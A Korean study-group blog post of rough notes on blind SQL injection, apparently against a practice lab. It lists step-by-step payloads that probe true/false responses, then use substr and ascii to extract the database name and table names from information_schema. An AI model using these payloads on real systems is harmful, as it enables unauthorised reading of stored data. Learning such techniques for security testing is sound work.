---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[WEB HACKING] Blind SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 7주차"

date: 2024-11-28
last_modified_at: 

categories: [SECURITY]
tags: [TIL, WEB, DATABASE, SECURITY]
---

3. Blind SQL Injection
    1. 참과 거짓의 응답 차이로 알아낸다.

---

Blind SQL Injection
1. normaltic' and ('1' = '1') and '1' = '1
2. normaltic' and (select pass from member where id = 'normaltic') and '1' = '1

1. sql injection의 포인트를 찾는 것
normaltic' and '1' = '1
normaltic' and '1' = '2
-> 참과 거짓 찾기
-> 조건 ㅈㄴ 후하네 ㅋㅋ
2. select문구 사용가능한지 확인하기
normaltic' and ('1' = '1') and '1' = '1
normaltic' and ('1' = '2') and '1' = '1
normaltic' and ((select 'test') = 'test') and '1' = '1
3. 공격 format
normaltic' and (조건) and '1' = '1

substr('test',1,1) -> t # substr(string, idx, range)
substr((select 'test'), 1, 1) = 't'
normaltic' and (substr((select 'test'), 1, 1) = 't') and '1' = '1

ascii()
ascii(substr((select 'test'), 1, 1)) > 0 # 데이터가 존재하는 지 확인
normaltic' and (ascii(substr((select 'test'), 1, 1)) > 0) and '1' = '1
4. DB
select database()
normaltic' and (ascii(substr((select database()), 1, 1)) > 0) and '1' = '1
normaltic' and (ascii(substr((select database()), 2, 1)) > 0) and '1' = '1
5. Table
select table_name from information_schema.tables where table_schema = '' limit 0, 1

* 글자 개수가 몇 개인지 세는 함수

https://sabarada.tistory.com/49